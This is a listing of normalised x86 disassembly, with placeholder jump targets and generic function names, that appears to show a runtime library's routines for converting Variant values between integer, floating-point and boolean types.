mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43f954
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_448078
sub_43fe04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_43e6b8
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_43fe92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f954
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
sub_43feb8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_43e6b8
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_43ff3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f954
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
sub_43ff60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_440035
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f954
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_43ff87 ]
jmp [ eax * 4 + jump_table_43ff99 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_43e6b8
sub_440058
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_44010e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43f954
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
movzx eax [ eax + lookup_table_44007b ]
jmp [ eax * 4 + jump_table_44008e ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_43e6b8
sub_440134
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4401fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_440484
test edx edx
je r-xdata
movzx eax [ eax + lookup_table_44015b ]
jmp [ eax * 4 + jump_table_44016f ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_43e6b8
sub_440220
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_447960
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
movzx edx [ ebx ]
mov cx 0x14
call sub_43eb4c
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_440c2c
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_4402cc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4403ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x10 ]
call sub_4358f8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4403c1
lea eax [ ebp - 0x24 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x20 ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x14
call sub_43eb4c
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
mov eax ebx
call sub_440c2c
and eax 0x7f
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_4403cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_440423
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_43f250
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_440484
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44042a
lea eax [ ebp - 0x18 ]
call sub_43ef08
retn
sub_440438
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_440484
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_4408da
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4404b7 ]
mov eax [ ebp - 0x4 ]
call sub_4402cc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4402cc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_440484
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440220
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4403cc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x14
mov ax 0x1
call sub_43e6b8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4402cc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_440438
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_440220
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
call sub_440220
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_44070b ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_447960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4402cc
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_440484
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
sub_440914
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x15
ja r-xdata
xor eax eax
push ebp
push sub_440a43
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_440484
cmp edx 0x7fffffff
jne r-xdata
movzx eax [ eax + lookup_table_44093d ]
jmp [ eax * 4 + jump_table_440953 ]
jbe r-xdata
cmp eax 0xffffffff
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_448078
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_43e6b8
sub_440a78
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_440b2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x5 ]
call sub_435ac8
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b31
lea eax [ ebp - 0xc ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
movzx edx [ ebx ]
mov cx 0xb
mov eax 0x80020005
call sub_43eb4c
jmp r-xdata
movzx edx [ ebx ]
mov cx 0xb
call sub_43eb4c
cmp [ ebp - 0x8 ] 0x1
sbb eax eax
inc eax
mov [ ebp - 0x5 ] al
jmp r-xdata
sub_440b3c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0xb
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0xb
call sub_43eb4c
cmp [ esp + 0x8 ] 0x1
sbb eax eax
inc eax
add esp 0x10
pop ebx
retn
sub_440b7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_440bd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x11 ]
call sub_43f250
lea eax [ ebp - 0x11 ]
call [ rw-data ]
lea eax [ ebp - 0x11 ]
call sub_440c2c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440bd7
lea eax [ ebp - 0x11 ]
call sub_43ef08
retn
sub_440be0
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
movzx eax [ esi ]
call sub_44534c
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0xb
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
cmp [ esp + 0xc ] 0x1
sbb eax eax
inc eax
mov [ edi ] al
sub_440c2c
push ebx
push ecx
mov ebx eax
movzx eax [ ebx ]
movzx edx ax
cmp edx 0x15
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_440c46 ]
mov eax ebx
call sub_440a78
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fild [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
fld [ ebx + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_440a78
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne [ esp ]
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_440c2c
mov [ esp ] al
jmp r-xdata
mov eax ebx
call sub_440b3c
mov [ esp ] al
jmp r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
mov eax ebx
call sub_440b7c
mov [ esp ] al
jmp r-xdata
dec dx
je r-xdata
mov [ esp ] 0x0
jmp r-xdata
mov dx 0xb
mov ax 0x1
call sub_43e6b8
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
mov eax ebx
call sub_440a78
mov [ esp ] al
jmp r-xdata
jmp r-xdata
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_440be0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x15
ja r-xdata
mov eax ebx
call sub_440b3c
mov [ esp ] al
mov eax ebx
call sub_440b3c
mov [ esp ] al
jmp r-xdata
jmp [ eax * 4 + jump_table_440e39 ]
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_440a78
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_440c2c
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_440fd4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_441089
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x4 ]
call sub_442f38
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_449f7c
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_437334
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
movzx edx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_43eb4c
jmp r-xdata
fld [ ebp - 0x20 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
movzx edx [ ebx ]
mov cx 0x5
call sub_43eb4c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441090
lea eax [ ebp - 0x24 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call sub_4499d8
retn
sub_441098
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
movzx edx [ ebx ]
mov cx 0x5
call sub_43eb4c
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_4410e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_441139
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_43f250
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_441194
